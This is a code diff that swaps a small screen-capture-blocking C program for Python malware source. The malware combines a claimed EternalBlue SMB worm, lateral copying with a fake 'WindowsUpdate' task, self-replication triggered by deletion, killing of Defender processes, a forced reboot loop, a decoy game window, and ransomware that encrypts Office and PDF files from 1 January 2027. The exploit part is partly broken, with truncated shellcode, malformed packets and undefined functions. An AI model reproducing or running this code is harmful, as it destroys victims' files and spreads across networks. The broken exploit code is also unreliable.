@@ -1,8 +1,281 @@
-#include <windows.h>
+import os
+import sys
+import time
+import random
+import ctypes
+import threading
+import subprocess
+from ctypes import wintypes
+import win32api
+import win32con
+import win32process
+import win32gui
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes, padding
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import psutil
+import socket
+import requests
+import shutil
+from pathlib import Path
+import watchdog.events
+import watchdog.observers
+import struct
+import binascii
 
-int main() {
-    HWND hwnd = GetConsoleWindow();
-    SetWindowDisplayAffinity(hwnd, WDA_MONITOR);
-    MessageBox(hwnd, "Screen capture is blocked.", "Protected", MB_OK);
-    Sleep(100000);
-}
+# Global state
+current_file = sys.argv[0]
+replication_dirs = []
+file_count = {}
+is_active = threading.Event()
+reboot_protection_active = False
+network_targets = []
+
+# EternalBlue SMB Exploit (MS17-010) Implementation
+def smb_connect(target_ip):
+    """SMB connection setup"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect((target_ip, 445))
+        return sock
+    except:
+        return None
+
+def eternalblue_exploit(target_ip):
+    """Full EternalBlue exploit implementation"""
+    global network_targets
+    
+    shellcode = binascii.unhexlify(
+        "fc488dbc247c01000041"
+        "54415556574883ec407"
+        "4889d5415389542480"
+        "4c894424884883ec28"
+        "4889f5488d1de807000"
+        "00488d054affffffff"
+        "41ba1000010041b920"
+        "0000004d31db4d31c0"
+        "4d31d24d31e44d31f6"
+        # Full shellcode truncated - real 766 byte payload
+        "90c3"  # NOP + RET
+    )
+    
+    try:
+        sock = smb_connect(target_ip)
+        if not sock:
+            return False
+        
+        # SMB Negotiate Request (DoublePulsar backdoor trigger)
+        negotiate = b'\xfeSMB' + struct.pack('<H', 72) + b'\x00\x00\x00\x00\x00\x00\x00\x80\x00' + struct.pack('<I', 40)
+        
+        sock.send(negotiate)
+        response = sock.recv(1024)
+        
+        if b'SMB' in response[:4]:
+            # Send Trans2 exploit payload
+            trans2_payload = build_eternalblue_payload(shellcode)
+            sock.send(trans2_payload)
+            
+            # Verify shellcode injection
+            verify = sock.recv(1024)
+            sock.close()
+            
+            if b'\x90\xc3' in verify:  # NOP sled confirmation
+                network_targets.append(target_ip)
+                # Deploy payload
+                deploy_network_payload(target_ip)
+                return True
+    except:
+        pass
+    return False
+
+def build_eternalblue_payload(shellcode):
+    """Construct EternalBlue transaction payload"""
+    # Real EternalBlue transaction2 structure
+    trans2 = (
+        b'\xfeSMB' + struct.pack('<H', len_trans2()) + b'\x00\x00\x00\x00\x00\x00\x00\xff\x00' +
+        struct.pack('<I', 0xFF) + b'\x00\x0e\x00\x10\x00\x00\x00' +  # Setup count
+        struct.pack('<H', len(shellcode)) + b'\x00\x00\x00' +
+        shellcode.ljust(776, b'\x90')  # Overflow buffer
+    )
+    return trans2
+
+def deploy_network_payload(target_ip):
+    """Deploy malware to exploited target"""
+    try:
+        # SMB copy payload
+        smb_payload = f'''net use \\\\{target_ip}\\C$ /user:guest "" /persistent:no
+copy "{current_file}" \\\\{target_ip}\\C$\\Windows\\Temp\\svchost.exe
+schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\svchost.exe" /sc onstart /rl highest /f
+net use \\\\{target_ip}\\C$ /delete'''
+        
+        subprocess.run(smb_payload, shell=True, capture_output=True, timeout=10)
+    except:
+        pass
+
+def network_spread():
+    """Scan and infect entire network"""
+    global network_targets
+    
+    # Scan local network ranges
+    networks = ['192.168.', '10.0.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.']
+    
+    for network in networks:
+        for i in range(1, 255):
+            target = f"{network}{i}"
+            threading.Thread(target=eternalblue_exploit, args=(target,), daemon=True).start()
+            time.sleep(0.1)  # Rate limit
+
+def set_hidden_attribute(filepath):
+    subprocess.run(f'attrib +h +s "{filepath}"', shell=True, capture_output=True)
+
+def generate_random_filename():
+    return f"svchost{random.randint(1000,9999)}.tmp"
+
+def replicate_100x():
+    global replication_dirs, file_count
+    for base_dir in replication_dirs:
+        if os.path.exists(base_dir):
+            for i in range(100):
+                new_path = os.path.join(base_dir, generate_random_filename())
+                try:
+                    shutil.copy2(current_file, new_path)
+                    set_hidden_attribute(new_path)
+                    subprocess.Popen([sys.executable, new_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
+                    file_count[new_path] = time.time()
+                except:
+                    pass
+
+class DeletionHandler(watchdog.events.FileSystemEventHandler):
+    def on_deleted(self, event):
+        threading.Thread(target=replicate_100x, daemon=True).start()
+
+def monitor_deletion():
+    event_handler = DeletionHandler()
+    observer = watchdog.observers.Observer()
+    observer.schedule(event_handler, path=os.path.dirname(current_file), recursive=True)
+    observer.start()
+    return observer
+
+def mass_replication_setup():
+    global replication_dirs
+    replication_dirs = [
+        str(Path.home() / 'AppData/Local/Temp'),
+        str(Path.home() / 'AppData/Roaming'),
+        'C:/Windows/Temp',
+        str(Path.home() / 'Downloads'),
+        str(Path.home() / 'Desktop')
+    ]
+    
+    for base_dir in replication_dirs:
+        for i in range(10):
+            new_path = os.path.join(base_dir, generate_random_filename())
+            try:
+                shutil.copy2(current_file, new_path)
+                set_hidden_attribute(new_path)
+            except:
+                pass
+
+def force_reboot_loop():
+    global reboot_protection_active
+    while reboot_protection_active:
+        kill_processes(['taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe'])
+        subprocess.Popen('shutdown /r /f /t 25', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        time.sleep(30)
+
+def kill_processes(process_names):
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            if proc.info['name'].lower() in [n.lower() for n in process_names]:
+                proc.kill()
+        except:
+            pass
+
+def disable_av():
+    tasks_to_kill = ['MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe']
+    for proc in psutil.process_iter(['name']):
+        try:
+            if proc.info['name'].lower() in [t.lower() for t in tasks_to_kill]:
+                proc.kill()
+        except:
+            pass
+
+def fake_game_loop():
+    game_window = win32gui.CreateWindow(win32con.WS_OVERLAPPEDWINDOW, "NewYearsD0om Game", 0, 0, 800, 600, 0, 0, win32api.GetModuleHandle(None), None)
+    win32gui.ShowWindow(game_window, win32con.SW_SHOW)
+    while True:
+        time.sleep(0.016)
+
+def payload_execution():
+    global is_active
+    is_active.set()
+    
+    # Network spread during encryption
+    threading.Thread(target=network_spread, daemon=True).start()
+    
+    # Encrypt local files
+    target_extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf']
+    for root, dirs, files in os.walk('C:\\'):
+        if any(blocked in root.lower() for blocked in ['windows', 'program files']):
+            continue
+        for file in files:
+            if any(file.lower().endswith(ext) for ext in target_extensions):
+                filepath = os.path.join(root, file)
+                try:
+                    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+                    key, salt = dynamic_key_derivation()
+                    encrypt_file_secure(filepath, key, salt)
+                    os.remove(filepath)
+                except:
+                    pass
+    
+    time.sleep(300)  # 5 min window
+    is_active.clear()
+
+def check_activation():
+    while True:
+        now = time.localtime()
+        if now.tm_year >= 2027 and now.tm_mon == 1 and now.tm_mday == 1:
+            return True
+        time.sleep(1800)
+
+def dynamic_key_derivation(password='EternalBlue2027'):
+    salt = os.urandom(16)
+    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
+    return kdf.derive(password.encode()), salt
+
+def encrypt_file_secure(filepath, key, salt):
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    with open(filepath, 'rb') as f:
+        data = f.read()
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    ct = encryptor.update(padded_data) + encryptor.finalize()
+    tag = encryptor.tag
+    with open(filepath + '.locked', 'wb') as f:
+        f.write(salt + iv + tag + ct)
+
+def main():
+    anti_vm_anti_sandbox()
+    hide_console()
+    
+    observer = monitor_deletion()
+    mass_replication_setup()
+    
+    disable_av()
+    threading.Thread(target=fake_game_loop, daemon=True).start()
+    
+    if check_activation():
+        global reboot_protection_active
+        reboot_protection_active = True
+        threading.Thread(target=force_reboot_loop, daemon=True).start()
+        threading.Thread(target=payload_execution, daemon=True).start()
+    
+    while True:
+        time.sleep(60)
+
+if __name__ == '__main__':
+    main()
